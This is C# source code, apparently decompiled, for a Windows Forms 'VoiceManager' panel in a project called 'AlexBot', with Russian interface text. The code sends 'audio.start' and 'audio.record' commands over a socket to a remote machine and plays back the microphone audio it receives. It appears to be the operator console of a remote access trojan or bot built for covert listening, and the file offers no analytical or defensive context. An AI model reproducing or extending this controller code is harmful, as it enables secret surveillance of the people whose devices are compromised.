using NAudio.Wave;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace AlexBot
{
	public class VoiceManager : Form
	{
		public Socket sock;

		public ToolSocket tsock;

		private bool ListenCapturePackages = false;

		private WaveOut output;

		private BufferedWaveProvider bufferStream;

		private IContainer components = null;

		private Button button1;

		private Label label1;

		public VoiceManager()
		{
			InitializeComponent();
		}

		private void Listener_Capture_Volume()
		{
			tsock.sendCommand(sock, "audio.start", "1");
			output = new WaveOut();
			bufferStream = new BufferedWaveProvider(new WaveFormat(8000, 16, 1));
			output.Init(bufferStream);
			output.Play();
			tsock.sendCommand(sock, "audio.record", "1");
			int received;
			while (ListenCapturePackages)
			{
				try
				{
					byte[] buffer = new byte[65535];
					received = sock.Receive(buffer);
					Action action = delegate
					{
						label1.Text = "Принято пакетов: " + received + " bytes";
					};
					if (base.InvokeRequired)
					{
						Invoke(action);
					}
					else
					{
						action();
					}
					bufferStream.AddSamples(buffer, 0, received);
				}
				catch (SocketException)
				{
				}
			}
		}

		private void Button1Click(object sender, EventArgs e)
		{
			if (!ListenCapturePackages)
			{
				ListenCapturePackages = true;
				button1.Text = "Стоп";
				Thread thread = new Thread(Listener_Capture_Volume);
				thread.IsBackground = true;
				thread.Start();
			}
			else
			{
				ListenCapturePackages = false;
				button1.Text = "Продолжить";
				output.Stop();
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			button1 = new System.Windows.Forms.Button();
			label1 = new System.Windows.Forms.Label();
			SuspendLayout();
			button1.Location = new System.Drawing.Point(12, 12);
			button1.Name = "button1";
			button1.Size = new System.Drawing.Size(75, 23);
			button1.TabIndex = 0;
			button1.Text = "Начать";
			button1.UseVisualStyleBackColor = true;
			button1.Click += new System.EventHandler(Button1Click);
			label1.Location = new System.Drawing.Point(93, 17);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(224, 23);
			label1.TabIndex = 1;
			label1.Text = "Принято пакетов: 0 bytes";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(254, 51);
			base.Controls.Add(label1);
			base.Controls.Add(button1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
			base.Name = "VoiceManager";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "VoiceManager";
			ResumeLayout(false);
		}
	}
}
